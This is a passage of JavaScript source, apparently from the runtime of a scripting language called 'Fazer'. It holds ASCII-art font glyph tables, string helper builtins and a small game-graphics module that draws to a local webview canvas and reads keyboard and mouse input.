            " ░    ░  ",
            " ░    ░  ",
            "         "
        ],
        "Y": [
            "▓██   ██▓",
            " ▒██  ██▒",
            "  ▒██ ██░",
            "  ░ ▐██▓░",
            "  ░ ██▒▓░",
            "   ██▒▒▒ ",
            " ▓██ ░▒░ ",
            " ▒ ▒ ░░  ",
            " ░ ░     ",
            " ░ ░     "
        ],
        "Z": [
            "▒███████▒",
            "▒ ▒ ▒ ▄▀░",
            "░ ▒ ▄▀▒░ ",
            "  ▄▀▒   ░",
            "▒███████▒",
            "░▒▒ ▓░▒░▒",
            "░░▒ ▒ ░ ▒",
            "░ ░ ░ ░ ░",
            "  ░ ░    ",
            "░        "
        ],
        "[": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "\\": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "]": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "^": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "_": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "`": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "a": [
            " ▄▄▄      ",
            "▒████▄    ",
            "▒██  ▀█▄  ",
            "░██▄▄▄▄██ ",
            " ▓█   ▓██▒",
            " ▒▒   ▓▒█░",
            "  ▒   ▒▒ ░",
            "  ░   ▒   ",
            "      ░  ░",
            "          "
        ],
        "b": [
            " ▄▄▄▄   ",
            "▓█████▄ ",
            "▒██▒ ▄██",
            "▒██░█▀  ",
            "░▓█  ▀█▓",
            "░▒▓███▀▒",
            "▒░▒   ░ ",
            " ░    ░ ",
            " ░      ",
            "      ░ "
        ],
        "c": [
            " ▄████▄  ",
            "▒██▀ ▀█  ",
            "▒▓█    ▄ ",
            "▒▓▓▄ ▄██▒",
            "▒ ▓███▀ ░",
            "░ ░▒ ▒  ░",
            "  ░  ▒   ",
            "░        ",
            "░ ░      ",
            "░        "
        ],
        "d": [
            "▓█████▄ ",
            "▒██▀ ██▌",
            "░██   █▌",
            "░▓█▄   ▌",
            "░▒████▓ ",
            " ▒▒▓  ▒ ",
            " ░ ▒  ▒ ",
            " ░ ░  ░ ",
            "   ░    ",
            " ░      "
        ],
        "e": [
            "▓█████ ",
            "▓█   ▀ ",
            "▒███   ",
            "▒▓█  ▄ ",
            "░▒████▒",
            "░░ ▒░ ░",
            " ░ ░  ░",
            "   ░   ",
            "   ░  ░",
            "       "
        ],
        "f": [
            "  █████▒",
            "▓██   ▒ ",
            "▒████ ░ ",
            "░▓█▒  ░ ",
            "░▒█░    ",
            " ▒ ░    ",
            " ░      ",
            " ░ ░    ",
            "        ",
            "        "
        ],
        "g": [
            "  ▄████ ",
            " ██▒ ▀█▒",
            "▒██░▄▄▄░",
            "░▓█  ██▓",
            "░▒▓███▀▒",
            " ░▒   ▒ ",
            "  ░   ░ ",
            "░ ░   ░ ",
            "      ░ ",
            "        "
        ],
        "h": [
            " ██░ ██ ",
            "▓██░ ██▒",
            "▒██▀▀██░",
            "░▓█ ░██ ",
            "░▓█▒░██▓",
            " ▒ ░░▒░▒",
            " ▒ ░▒░ ░",
            " ░  ░░ ░",
            " ░  ░  ░",
            "        "
        ],
        "i": [
            " ██▓",
            "▓██▒",
            "▒██▒",
            "░██░",
            "░██░",
            "░▓  ",
            " ▒ ░",
            " ▒ ░",
            " ░  ",
            "    "
        ],
        "j": [
            " ▄▄▄██▀▀▀",
            "   ▒██   ",
            "   ░██   ",
            "▓██▄██▓  ",
            " ▓███▒   ",
            " ▒▓▒▒░   ",
            " ▒ ░▒░   ",
            " ░ ░ ░   ",
            " ░   ░   ",
            "         "
        ],
        "k": [
            " ██ ▄█▀",
            " ██▄█▒ ",
            "▓███▄░ ",
            "▓██ █▄ ",
            "▒██▒ █▄",
            "▒ ▒▒ ▓▒",
            "░ ░▒ ▒░",
            "░ ░░ ░ ",
            "░  ░   ",
            "       "
        ],
        "l": [
            " ██▓    ",
            "▓██▒    ",
            "▒██░    ",
            "▒██░    ",
            "░██████▒",
            "░ ▒░▓  ░",
            "░ ░ ▒  ░",
            "  ░ ░   ",
            "    ░  ░",
            "        "
        ],
        "m": [
            " ███▄ ▄███▓",
            "▓██▒▀█▀ ██▒",
            "▓██    ▓██░",
            "▒██    ▒██ ",
            "▒██▒   ░██▒",
            "░ ▒░   ░  ░",
            "░  ░      ░",
            "░      ░   ",
            "       ░   ",
            "           "
        ],
        "n": [
            " ███▄    █ ",
            " ██ ▀█   █ ",
            "▓██  ▀█ ██▒",
            "▓██▒  ▐▌██▒",
            "▒██░   ▓██░",
            "░ ▒░   ▒ ▒ ",
            "░ ░░   ░ ▒░",
            "   ░   ░ ░ ",
            "         ░ ",
            "           "
        ],
        "o": [
            " ▒█████  ",
            "▒██▒  ██▒",
            "▒██░  ██▒",
            "▒██   ██░",
            "░ ████▓▒░",
            "░ ▒░▒░▒░ ",
            "  ░ ▒ ▒░ ",
            "░ ░ ░ ▒  ",
            "    ░ ░  ",
            "         "
        ],
        "p": [
            " ██▓███  ",
            "▓██░  ██▒",
            "▓██░ ██▓▒",
            "▒██▄█▓▒ ▒",
            "▒██▒ ░  ░",
            "▒▓▒░ ░  ░",
            "░▒ ░     ",
            "░░       ",
            "         ",
            "         "
        ],
        "q": [
            "  █████  ",
            "▒██▓  ██▒",
            "▒██▒  ██░",
            "░██  █▀ ░",
            "░▒███▒█▄ ",
            "░░ ▒▒░ ▒ ",
            " ░ ▒░  ░ ",
            "   ░   ░ ",
            "    ░    ",
            "         "
        ],
        "r": [
            " ██▀███  ",
            "▓██ ▒ ██▒",
            "▓██ ░▄█ ▒",
            "▒██▀▀█▄  ",
            "░██▓ ▒██▒",
            "░ ▒▓ ░▒▓░",
            "  ░▒ ░ ▒░",
            "  ░░   ░ ",
            "   ░     ",
            "         "
        ],
        "s": [
            "  ██████ ",
            "▒██    ▒ ",
            "░ ▓██▄   ",
            "  ▒   ██▒",
            "▒██████▒▒",
            "▒ ▒▓▒ ▒ ░",
            "░ ░▒  ░ ░",
            "░  ░  ░  ",
            "      ░  ",
            "         "
        ],
        "t": [
            "▄▄▄█████▓",
            "▓  ██▒ ▓▒",
            "▒ ▓██░ ▒░",
            "░ ▓██▓ ░ ",
            "  ▒██▒ ░ ",
            "  ▒ ░░   ",
            "    ░    ",
            "  ░      ",
            "         ",
            "         "
        ],
        "u": [
            " █    ██ ",
            " ██  ▓██▒",
            "▓██  ▒██░",
            "▓▓█  ░██░",
            "▒▒█████▓ ",
            "░▒▓▒ ▒ ▒ ",
            "░░▒░ ░ ░ ",
            " ░░░ ░ ░ ",
            "   ░     ",
            "         "
        ],
        "v": [
            " ██▒   █▓",
            "▓██░   █▒",
            " ▓██  █▒░",
            "  ▒██ █░░",
            "   ▒▀█░  ",
            "   ░ ▐░  ",
            "   ░ ░░  ",
            "     ░░  ",
            "      ░  ",
            "     ░   "
        ],
        "w": [
            " █     █░",
            "▓█░ █ ░█░",
            "▒█░ █ ░█ ",
            "░█░ █ ░█ ",
            "░░██▒██▓ ",
            "░ ▓░▒ ▒  ",
            "  ▒ ░ ░  ",
            "  ░   ░  ",
            "    ░    ",
            "         "
        ],
        "x": [
            "▒██   ██▒",
            "▒▒ █ █ ▒░",
            "░░  █   ░",
            " ░ █ █ ▒ ",
            "▒██▒ ▒██▒",
            "▒▒ ░ ░▓ ░",
            "░░   ░▒ ░",
            " ░    ░  ",
            " ░    ░  ",
            "         "
        ],
        "y": [
            "▓██   ██▓",
            " ▒██  ██▒",
            "  ▒██ ██░",
            "  ░ ▐██▓░",
            "  ░ ██▒▓░",
            "   ██▒▒▒ ",
            " ▓██ ░▒░ ",
            " ▒ ▒ ░░  ",
            " ░ ░     ",
            " ░ ░     "
        ],
        "z": [
            "▒███████▒",
            "▒ ▒ ▒ ▄▀░",
            "░ ▒ ▄▀▒░ ",
            "  ▄▀▒   ░",
            "▒███████▒",
            "░▒▒ ▓░▒░▒",
            "░░▒ ▒ ░ ▒",
            "░ ░ ░ ░ ░",
            "  ░ ░    ",
            "░        "
        ],
        "{": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "|": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "}": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ],
        "~": [
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ]
    },
    "elite": {
        "0": [
            " <> ",
            "/  \\",
            "\\__/",
            "    "
        ],
        "1": [
            " /| ",
            "  | ",
            " _|_",
            "    "
        ],
        "2": [
            " __)",
            "(__ ",
            "(___",
            "    "
        ],
        "3": [
            " __)",
            " __)",
            "(__)",
            "    "
        ],
        "4": [
            "|__|",
            "   |",
            "   |",
            "    "
        ],
        "5": [
            "|__ ",
            "   )",
            "(__/",
            "    "
        ],
        "6": [
            " /_ ",
            "|_ )",
            "|__/",
            "    "
        ],
        "7": [
            "~~/ ",
            " /  ",
            "/   ",
            "    "
        ],
        "8": [
            "(~~)",
            "(__)",
            "    ",
            "    "
        ],
        "9": [
            "(~~|",
            " __|",
            "    ",
            "    "
        ],
        " ": [
            "    ",
            "    ",
            "    ",
            "    "
        ],
        "A": [
            " /\\ ",
            "/  \\",
            "~~~~",
            "|  |"
        ],
        "B": [
            "|~\\ ",
            "|_/ ",
            "| \\ ",
            "|_/ "
        ],
        "C": [
            " /` ",
            "|   ",
            "|   ",
            " \\_,"
        ],
        "D": [
            "|\\  ",
            "| ) ",
            "|/  ",
            "|   "
        ],
        "E": [
            "|~~ ",
            "|-  ",
            "|_  ",
            "    "
        ],
        "F": [
            "|~~ ",
            "|-  ",
            "|   ",
            "    "
        ],
        "G": [
            " /` ",
            "|   ",
            "|_\\ ",
            " \\_,"
        ],
        "H": [
            "|  |",
            "|--|",
            "|  |",
            "    "
        ],
        "I": [
            " |  ",
            " |  ",
            " |  ",
            "    "
        ],
        "J": [
            "   |",
            "   |",
            "|__|",
            "    "
        ],
        "K": [
            "| / ",
            "|<  ",
            "| \\ ",
            "    "
        ],
        "L": [
            "|   ",
            "|   ",
            "|__ ",
            "    "
        ],
        "M": [
            "|\\/|",
            "|  |",
            "|  |",
            "    "
        ],
        "N": [
            "|\\ |",
            "| \\|",
            "|  |",
            "    "
        ],
        "O": [
            "/~~\\",
            "|  |",
            "\\__/",
            "    "
        ],
        "P": [
            "|~~\\",
            "|__/",
            "|   ",
            "    "
        ],
        "Q": [
            "/~~\\",
            "|  |",
            "\\__\\",
            "    "
        ],
        "R": [
            "|~~\\",
            "|_ /",
            "| \\ ",
            "    "
        ],
        "S": [
            " /~ ",
            " `-. ",
            "__/ ",
            "    "
        ],
        "T": [
            "~~~~",
            " || ",
            " || ",
            "    "
        ],
        "U": [
            "|  |",
            "|  |",
            "\\__/",
            "    "
        ],
        "V": [
            "\\  /",
            " \\/ ",
            "    ",
            "    "
        ],
        "W": [
            "\\  /",
            " \\/ ",
            " /\\ ",
            "/  \\"
        ],
        "X": [
            "\\  /",
            " >< ",
            "/  \\",
            "    "
        ],
        "Y": [
            "\\  /",
            " \\/ ",
            " || ",
            "    "
        ],
        "Z": [
            "~~~/",
            "  / ",
            " /__",
            "    "
        ]
    },
    "classy": {
        "0": [
            " __ ",
            "/  \\",
            "\\__/",
            "    "
        ],
        "1": [
            " /| ",
            "  | ",
            " _|_",
            "    "
        ],
        "2": [
            " __ ",
            "  _)",
            " /__",
            "    "
        ],
        "3": [
            " __ ",
            " _/ ",
            " \\__",
            "    "
        ],
        "4": [
            "    ",
            "|__|",
            "   |",
            "    "
        ],
        "5": [
            " __ ",
            "|_  ",
            " __|",
            "    "
        ],
        "6": [
            " __ ",
            "/_  ",
            "\\__/",
            "    "
        ],
        "7": [
            " __ ",
            "  / ",
            " /  ",
            "    "
        ],
        "8": [
            " __ ",
            "(<>)",
            "/__\\",
            "    "
        ],
        "9": [
            " __ ",
            "(_/ ",
            " /  ",
            "    "
        ],
        " ": [
            "    ",
            "    ",
            "    ",
            "    "
        ],
        "A": [
            " __ ",
            "/  \\",
            "|__|",
            "|  |"
        ],
        "B": [
            " __ ",
            "|__)",
            "|__)",
            "    "
        ],
        "C": [
            " __ ",
            "/  `",
            "\\__,",
            "    "
        ],
        "D": [
            " __ ",
            "|  \\",
            "|__/",
            "    "
        ],
        "E": [
            " ___",
            "|__ ",
            "|___",
            "    "
        ],
        "F": [
            " ___",
            "|__ ",
            "|   ",
            "    "
        ],
        "G": [
            " __ ",
            "/ _`",
            "\\__>",
            "    "
        ],
        "H": [
            "    ",
            "|__|",
            "|  |",
            "    "
        ],
        "I": [
            "    ",
            " |  ",
            " |  ",
            "    "
        ],
        "J": [
            "    ",
            "   |",
            "\\__/",
            "    "
        ],
        "K": [
            "    ",
            "|__/",
            "|  \\",
            "    "
        ],
        "L": [
            "    ",
            "|   ",
            "|___",
            "    "
        ],
        "M": [
            "    ",
            "|\\/|",
            "|  |",
            "    "
        ],
        "N": [
            "    ",
            "|\\ |",
            "| \\|",
            "    "
        ],
        "O": [
            " __ ",
            "/  \\",
            "\\__/",
            "    "
        ],
        "P": [
            " __ ",
            "|__)",
            "|   ",
            "    "
        ],
        "Q": [
            " __ ",
            "/  \\",
            "\\__X",
            "    "
        ],
        "R": [
            " __ ",
            "|__)",
            "|  \\",
            "    "
        ],
        "S": [
            " __ ",
            "/__`",
            ".__/",
            "    "
        ],
        "T": [
            "___ ",
            " |  ",
            " |  ",
            "    "
        ],
        "U": [
            "    ",
            "|  |",
            "\\__/",
            "    "
        ],
        "V": [
            "    ",
            "\\  /",
            " \\/ ",
            "    "
        ],
        "W": [
            "    ",
            "|  |",
            "|/\\|",
            "    "
        ],
        "X": [
            "    ",
            "\\_/",
            "/ \\ ",
            "    "
        ],
        "Y": [
            "    ",
            "\\_/",
            " |  ",
            "    "
        ],
        "Z": [
            " __ ",
            "  / ",
            " /_ ",
            "    "
        ]
    },
    "delta": {
        "0": [
            " ___ ",
            "/ _ \\",
            "|/ \\|",
            "\\_/_/",
            "     "
        ],
        "1": [
            "  ^  ",
            " /|  ",
            "  |  ",
            "  |  ",
            " ___ "
        ],
        "2": [
            " ___ ",
            "/   \\",
            "   / ",
            "  /  ",
            "|___ "
        ],
        "3": [
            " ___ ",
            "    /",
            "  _/ ",
            "    \\",
            "\\___/"
        ],
        "4": [
            "     ",
            "|  | ",
            "|__| ",
            "   | ",
            "   | "
        ],
        "5": [
            " ___ ",
            "|    ",
            "|___ ",
            "    |",
            "|___/"
        ],
        "6": [
            " ___ ",
            "/    ",
            "|___ ",
            "|   |",
            "\\___/"
        ],
        "7": [
            " ___ ",
            "   / ",
            "  /  ",
            " /   ",
            "/    "
        ],
        "8": [
            " ___ ",
            "( _ )",
            "/ _ \\",
            "\\___/",
            "     "
        ],
        "9": [
            " ___ ",
            "|   |",
            "\\___|",
            "    |",
            "\\___/"
        ],
        " ": [
            "     ",
            "     ",
            "     ",
            "     ",
            "     "
        ],
        "A": [
            "  ^  ",
            " / \\ ",
            "/___\\",
            "|   |",
            "|___|"
        ],
        "B": [
            " ___ ",
            "|   \\",
            "|___/",
            "|   \\",
            "|___/"
        ],
        "C": [
            " ___ ",
            "/   \\",
            "|    ",
            "|    ",
            "\\___/"
        ],
        "D": [
            " ___ ",
            "|   \\",
            "|    |",
            "|    |",
            "|___/"
        ],
        "E": [
            " ___ ",
            "|   |",
            "|___|",
            "|   |",
            "|___|"
        ],
        "F": [
            " ___ ",
            "|   |",
            "|___|",
            "|    ",
            "|    "
        ],
        "G": [
            " ___ ",
            "/   \\",
            "|  __",
            "| |  |",
            "\\_\\__|"
        ],
        "H": [
            "     ",
            "|   |",
            "|___|",
            "|   |",
            "|   |"
        ],
        "I": [
            " ___ ",
            "  |  ",
            "  |  ",
            "  |  ",
            " ___ "
        ],
        "J": [
            "     ",
            "    |",
            "    |",
            "|   |",
            "\\___/"
        ],
        "K": [
            "     ",
            "|  /",
            "| / ",
            "| \\ ",
            "|  \\"
        ],
        "L": [
            "     ",
            "|    ",
            "|    ",
            "|    ",
            "|___ "
        ],
        "M": [
            "     ",
            "|\\ /|",
            "| v |",
            "|   |",
            "|   |"
        ],
        "N": [
            "     ",
            "|\\  |",
            "| \\ |",
            "|  \\|",
            "|   |"
        ],
        "O": [
            " ___ ",
            "/   \\",
            "|   |",
            "|   |",
            "\\___/"
        ],
        "P": [
            " ___ ",
            "|   \\",
            "|___/",
            "|    ",
            "|    "
        ],
        "Q": [
            " ___ ",
            "/   \\",
            "|   |",
            "|  \\|",
            "\\___\\"
        ],
        "R": [
            " ___ ",
            "|   \\",
            "|___/",
            "|  \\ ",
            "|   \\"
        ],
        "S": [
            " ___ ",
            "/   \\",
            "\\___ ",
            "    \\",
            "\\___/"
        ],
        "T": [
            " ___ ",
            "- | -",
            "  |  ",
            "  |  ",
            "  |  "
        ],
        "U": [
            "     ",
            "|   |",
            "|   |",
            "|   |",
            "\\___/"
        ],
        "V": [
            "     ",
            "\\   /",
            " \\ / ",
            "  V  ",
            "  V  "
        ],
        "W": [
            "     ",
            "|   |",
            "| | |",
            "|/ \\|",
            "W   W"
        ],
        "X": [
            "     ",
            "\\   /",
            " > < ",
            "/   \\",
            "/   \\"
        ],
        "Y": [
            "     ",
            "\\   /",
            " \\ / ",
            "  |  ",
            "  |  "
        ],
        "Z": [
            " ___ ",
            "   / ",
            "  /  ",
            " /   ",
            "|___ "
        ]
    },
    "ansi_regular": {
        "0": [
            " ████ ",
            "██  ██",
            "██  ██",
            "██  ██",
            " ████ "
        ],
        "1": [
            "  ██  ",
            " ███  ",
            "  ██  ",
            "  ██  ",
            "██████"
        ],
        "2": [
            "█████ ",
            "    ██",
            "█████ ",
            "██    ",
            "██████"
        ],
        "3": [
            "█████ ",
            "    ██",
            "  ████",
            "    ██",
            "█████ "
        ],
        "4": [
            "██  ██",
            "██  ██",
            "██████",
            "    ██",
            "    ██"
        ],
        "5": [
            "██████",
            "██    ",
            "█████ ",
            "    ██",
            "█████ "
        ],
        "6": [
            " ████ ",
            "██    ",
            "█████ ",
            "██  ██",
            " ████ "
        ],
        "7": [
            "██████",
            "   ██ ",
            "  ██  ",
            " ██   ",
            "██    "
        ],
        "8": [
            " ████ ",
            "██  ██",
            " ████ ",
            "██  ██",
            " ████ "
        ],
        "9": [
            " ████ ",
            "██  ██",
            " █████",
            "    ██",
            " ████ "
        ],
        " ": [
            "     ",
            "     ",
            "     ",
            "     ",
            "     "
        ],
        "A": [
            " ████ ",
            "██  ██",
            "██████",
            "██  ██",
            "██  ██"
        ],
        "B": [
            "█████ ",
            "██  ██",
            "█████ ",
            "██  ██",
            "█████ "
        ],
        "C": [
            " ████ ",
            "██    ",
            "██    ",
            "██    ",
            " ████ "
        ],
        "D": [
            "████  ",
            "██  ██",
            "██  ██",
            "██  ██",
            "████  "
        ],
        "E": [
            "██████",
            "██    ",
            "████  ",
            "██    ",
            "██████"
        ],
        "F": [
            "██████",
            "██    ",
            "████  ",
            "██    ",
            "██    "
        ],
        "G": [
            " ████ ",
            "██    ",
            "██  ██",
            "██  ██",
            " ████ "
        ],
        "H": [
            "██  ██",
            "██  ██",
            "██████",
            "██  ██",
            "██  ██"
        ],
        "I": [
            "██████",
            "  ██  ",
            "  ██  ",
            "  ██  ",
            "██████"
        ],
        "J": [
            "██████",
            "  ██  ",
            "  ██  ",
            "████  ",
            " ██   "
        ],
        "K": [
            "██  ██",
            "██ ██ ",
            "████  ",
            "██ ██ ",
            "██  ██"
        ],
        "L": [
            "██    ",
            "██    ",
            "██    ",
            "██    ",
            "██████"
        ],
        "M": [
            "██  ██",
            "██████",
            "██████",
            "██  ██",
            "██  ██"
        ],
        "N": [
            "██  ██",
            "███ ██",
            "██████",
            "██ ███",
            "██  ██"
        ],
        "O": [
            " ████ ",
            "██  ██",
            "██  ██",
            "██  ██",
            " ████ "
        ],
        "P": [
            "█████ ",
            "██  ██",
            "█████ ",
            "██    ",
            "██    "
        ],
        "Q": [
            " ████ ",
            "██  ██",
            "██  ██",
            "██ ██ ",
            " ████ "
        ],
        "R": [
            "█████ ",
            "██  ██",
            "█████ ",
            "██  ██",
            "██  ██"
        ],
        "S": [
            " █████",
            "██    ",
            " ████ ",
            "    ██",
            "█████ "
        ],
        "T": [
            "██████",
            "  ██  ",
            "  ██  ",
            "  ██  ",
            "  ██  "
        ],
        "U": [
            "██  ██",
            "██  ██",
            "██  ██",
            "██  ██",
            " ████ "
        ],
        "V": [
            "██  ██",
            "██  ██",
            "██  ██",
            " ████ ",
            "  ██  "
        ],
        "W": [
            "██  ██",
            "██  ██",
            "██████",
            "██████",
            "██  ██"
        ],
        "X": [
            "██  ██",
            " ████ ",
            "  ██  ",
            " ████ ",
            "██  ██"
        ],
        "Y": [
            "██  ██",
            " ████ ",
            "  ██  ",
            "  ██  ",
            "  ██  "
        ],
        "Z": [
            "██████",
            "   ██ ",
            "  ██  ",
            " ██   ",
            "██████"
        ]
    },
    "ansi_compact": {
        "0": [
            "█▀█",
            "█ █",
            "▀▀▀"
        ],
        "1": [
            "▄█ ",
            " █ ",
            "▄█▄"
        ],
        "2": [
            "▀▀█",
            " █ ",
            "█▀▀"
        ],
        "3": [
            "▀▀█",
            " ▀█",
            "▀▀▀"
        ],
        "4": [
            "█ █",
            "█▀█",
            "  █"
        ],
        "5": [
            "█▀▀",
            "▀▀▄",
            "▀▀▀"
        ],
        "6": [
            "█▀ ",
            "█▀█",
            "▀▀▀"
        ],
        "7": [
            "▀▀█",
            "  █",
            "  ▀"
        ],
        "8": [
            "█▀█",
            "█▀█",
            "▀▀▀"
        ],
        "9": [
            "█▀█",
            "▀▀█",
            "  ▀"
        ],
        " ": [
            "   ",
            "   ",
            "   "
        ],
        "A": [
            "▄█▄",
            "█▀█",
            "▀ ▀"
        ],
        "B": [
            "█▀▄",
            "█▀▄",
            "▀▀ "
        ],
        "C": [
            "▄▀▀",
            "█  ",
            "▀▀▀"
        ],
        "D": [
            "█▀▄",
            "█ █",
            "▀▀ "
        ],
        "E": [
            "█▀▀",
            "█▀▀",
            "▀▀▀"
        ],
        "F": [
            "█▀▀",
            "█▀▀",
            "▀  "
        ],
        "G": [
            "█▀▀",
            "█ █",
            "▀▀▀"
        ],
        "H": [
            "█ █",
            "█▀█",
            "▀ ▀"
        ],
        "I": [
            "▀█▀",
            " █ ",
            "▀█▀"
        ],
        "J": [
            " ▄▄",
            " █ ",
            "▀  "
        ],
        "K": [
            "█ ▄",
            "█▀▄",
            "▀ ▀"
        ],
        "L": [
            "█  ",
            "█  ",
            "▀▀▀"
        ],
        "M": [
            "█▀█",
            "█ █",
            "▀ ▀"
        ],
        "N": [
            "█▀▄",
            "█ █",
            "▀ ▀"
        ],
        "O": [
            "▄▀▄",
            "█ █",
            "▀▀▀"
        ],
        "P": [
            "█▀▄",
            "█▀▀",
            "▀  "
        ],
        "Q": [
            "▄▀▄",
            "█ █",
            "▀▀█"
        ],
        "R": [
            "█▀▄",
            "█▀▄",
            "▀ ▀"
        ],
        "S": [
            "▄▀▀",
            "▀▀▄",
            "▀▀▀"
        ],
        "T": [
            "▀█▀",
            " █ ",
            " ▀ "
        ],
        "U": [
            "█ █",
            "█ █",
            "▀▀▀"
        ],
        "V": [
            "█ █",
            "█ █",
            "▀▀ "
        ],
        "W": [
            "█ █",
            "█▄█",
            "▀ ▀"
        ],
        "X": [
            "▀▄▀",
            " █ ",
            "▀ ▀"
        ],
        "Y": [
            "█ █",
            "▀█▀",
            " ▀ "
        ],
        "Z": [
            "▀▀█",
            " ▄▀",
            "█▀▀"
        ]
    }
};

// register builtins in global scope
    const builtins = {
      
      // ──────────────────────────────────────────────────────────────────────────
      // FAZER SECURITY & INNOVATION SUITE (v3.0)
      // ──────────────────────────────────────────────────────────────────────────

      // [GFX] Native Game & App Engine (No HTML required)
      Math: Math,

      // [STR] String Manipulation
      str_split: (s, sep) => String(s).split(sep),
      str_sub: (s, start, end) => String(s).substring(start, end),
      str_replace: (s, a, b) => String(s).split(a).join(b),
      str_trim: (s) => String(s).trim(),
      str_len: (s) => String(s).length,
      str_lower: (s) => String(s).toLowerCase(),
      str_upper: (s) => String(s).toUpperCase(),
      str_contains: (s, sub) => String(s).includes(sub),
      str_starts: (s, sub) => String(s).startsWith(sub),
      str_ends: (s, sub) => String(s).endsWith(sub),
      str_index: (s, sub) => String(s).indexOf(sub),

      gfx: {
          _width: 800,
          _height: 600,
          _title: "Game",
          _running: false,
          _queue: [],
          _inputs: { keys: {}, mouse: {x:0, y:0, down:false} },
          
          // Initialize Window (2D Mode)
          init: async (title, w, h) => {
              builtins.gfx._title = title || "Fazer App";
              builtins.gfx._width = Number(w) || 800;
              builtins.gfx._height = Number(h) || 600;
              builtins.gfx._mode = "2d";
              
              // Start the renderer
              await builtins.webview.start({
                  port: 0,
                  title: builtins.gfx._title,
                  width: builtins.gfx._width,
                  height: builtins.gfx._height,
                  html: builtins.gfx._get_renderer_html()
              });
              builtins.gfx._running = true;
              return true;
          },

          // Initialize Window (3D Mode - WebGL)
          init3d: async (title, w, h) => {
              builtins.gfx._title = title || "Fazer 3D App";
              builtins.gfx._width = Number(w) || 800;
              builtins.gfx._height = Number(h) || 600;
              builtins.gfx._mode = "3d";

              await builtins.webview.start({
                  port: 0,
                  title: builtins.gfx._title,
                  width: builtins.gfx._width,
                  height: builtins.gfx._height,
                  html: builtins.gfx._get_renderer_html_3d() // New WebGL Renderer
              });
              builtins.gfx._running = true;
              return true;
          },
          
          // Game Loop
          loop: (updateFn) => {
              if (!builtins.gfx._running) return;
              
              const interval = setInterval(async () => {
                  if (!builtins.gfx._running) { clearInterval(interval); return; }
                  
                  builtins.gfx._queue = [];
                  
                  try {
                      await this._call(updateFn, [], this.global);
                  } catch(e) {
                      console.error("Game Loop Error:", e);
                      clearInterval(interval);
                  }
                  
                  builtins.webview.send("gfx_frame", builtins.gfx._queue);
                  
              }, 16); 
          },
          
          // Drawing Commands (2D)
          clear: (color) => builtins.gfx._queue.push({ op: "clear", color }),
          rect: (x, y, w, h, color) => builtins.gfx._queue.push({ op: "rect", x, y, w, h, color }),
          circle: (x, y, r, color) => builtins.gfx._queue.push({ op: "circle", x, y, r, color }),
          text: (x, y, text, color, size) => builtins.gfx._queue.push({ op: "text", x, y, text, color, size }),
          line: (x1, y1, x2, y2, color, width) => builtins.gfx._queue.push({ op: "line", x1, y1, x2, y2, color, width }),
          
          // 3D Commands
          cube: (x, y, z, size, color) => builtins.gfx._queue.push({ op: "cube", x, y, z, size, color }), // Legacy/2.5D
          
          // Real 3D API
          mesh_create: (id, vertices, colors, normals) => builtins.webview.send("mesh_upload", { id, vertices, colors, normals }),
          draw: (id, x,y,z, rx,ry,rz, sx,sy,sz) => builtins.gfx._queue.push({ op: "draw_mesh", id, x,y,z, rx,ry,rz, sx,sy,sz }),
          camera: (x,y,z, tx,ty,tz) => builtins.gfx._queue.push({ op: "camera", x,y,z, tx,ty,tz }),
          light: (x,y,z) => builtins.gfx._queue.push({ op: "light", x,y,z }),
          
          // Input
          key: (k) => builtins.gfx._inputs.keys[k] === true,
          mouse_x: () => builtins.gfx._inputs.mouse.x,
          mouse_y: () => builtins.gfx._inputs.mouse.y,
          mouse_down: () => builtins.gfx._inputs.mouse.down,
          
          // Internal Renderer Template (2D)
          _get_renderer_html: () => `
<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin:0; overflow:hidden; background:#000; }
        canvas { display:block; }
    </style>
</head>
<body>
    <canvas id="c"></canvas>
    <script>
        const canvas = document.getElementById('c');
        const ctx = canvas.getContext('2d');
        
        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.onresize = resize;
        resize();

        const events = new EventSource('/_fazer/events');
        events.onmessage = (e) => {
            const msg = JSON.parse(e.data);
            if (msg.type === 'gfx_frame') {
                render(msg.data);
            }
        };
        
        const inputs = { keys: {}, mouse: {x:0, y:0, down:false} };
        
        window.onkeydown = (e) => { inputs.keys[e.key] = true; sendInput(); };
        window.onkeyup = (e) => { inputs.keys[e.key] = false; sendInput(); };
        window.onmousemove = (e) => { inputs.mouse.x = e.clientX; inputs.mouse.y = e.clientY; sendInput(); };
        window.onmousedown = () => { inputs.mouse.down = true; sendInput(); };
        window.onmouseup = () => { inputs.mouse.down = false; sendInput(); };
        
        function sendInput() {
            fetch('/_fazer/send', {
                method: 'POST',
                body: JSON.stringify({ type: 'input', inputs: inputs })
            });
        }
        
        function render(queue) {
            queue.forEach(cmd => {
                if (cmd.op === 'clear') {
                    ctx.fillStyle = cmd.color || '#000';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                }
                else if (cmd.op === 'rect') {
                    ctx.fillStyle = cmd.color;
                    ctx.fillRect(cmd.x, cmd.y, cmd.w, cmd.h);
                }
                else if (cmd.op === 'circle') {
                    ctx.beginPath();
                    ctx.arc(cmd.x, cmd.y, cmd.r, 0, Math.PI * 2);
                    ctx.fillStyle = cmd.color;
                    ctx.fill();
                }
                else if (cmd.op === 'text') {
                    ctx.fillStyle = cmd.color;
                    ctx.font = (cmd.size || 20) + "px Arial";
                    ctx.fillText(cmd.text, cmd.x, cmd.y);
                }
                else if (cmd.op === 'line') {
                    ctx.beginPath();
                    ctx.moveTo(cmd.x1, cmd.y1);
                    ctx.lineTo(cmd.x2, cmd.y2);
                    ctx.strokeStyle = cmd.color;
                    ctx.lineWidth = cmd.width || 1;
                    ctx.stroke();
                }
                else if (cmd.op === 'cube') {
                     // 2.5D Fallback
                     const size = cmd.size;
